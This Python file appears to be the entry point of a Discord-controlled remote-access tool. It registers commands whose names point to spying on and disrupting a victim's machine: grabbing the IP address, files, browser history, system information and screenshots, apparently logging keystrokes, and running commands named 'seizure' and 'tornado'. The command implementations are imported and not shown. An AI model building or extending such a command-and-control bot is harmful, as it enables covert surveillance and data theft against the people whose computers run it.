import discord
from discord.ext import commands
import discodd
import info
from command import ip_command, screenswipe_command, tornado_command, seizure_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print("Bot is ready.")
    for guild in bot.guilds:
        try:
            await info.start_messagesend(bot, guild)
        except discord.Forbidden as e:
            print(info.handle_permission_error(guild.name, e))
        except discord.HTTPException as e:
            print(info.handle_http_error(guild.name, e))
        except Exception as e:
            print(info.handle_generic_error(guild.name, e))

bot.allowed_channel_ids = {}

@bot.check
async def check_channel(ctx):
    allowed_channel_id = bot.allowed_channel_ids.get(ctx.guild.id)
    return allowed_channel_id is None or ctx.channel.id == allowed_channel_id

# Adding commands from the command module
bot.add_command(commands.Command(ip_command.ip, name='ip'))
bot.add_command(commands.Command(clean_command.clean, name='clean'))
bot.add_command(commands.Command(lp_command.lp, name='lp'))
bot.add_command(commands.Command(tree_command.tree, name='tree'))
bot.add_command(commands.Command(getfiles_command.getfiles, name='getfiles'))
bot.add_command(commands.Command(kp_command.kp, name='kp'))
bot.add_command(commands.Command(getbrowserhistory_command.getbrowserhistory, name='getbrowserhistory'))
bot.add_command(commands.Command(share_command.share_file, name='share'))
bot.add_command(commands.Command(sysinfo_command.sysinfo, name='sysinfo'))
bot.add_command(commands.Command(screenshot_command.screenshot, name='screenshot'))
bot.add_command(commands.Command(seizure_command.seizure, name='seizure'))
bot.add_command(commands.Command(tornado_command.tornado, name='tornado'))
bot.add_command(commands.Command(screenswipe_command.screenswipe, name='screenswipe'))

bot.run(discodd.TOKEN)
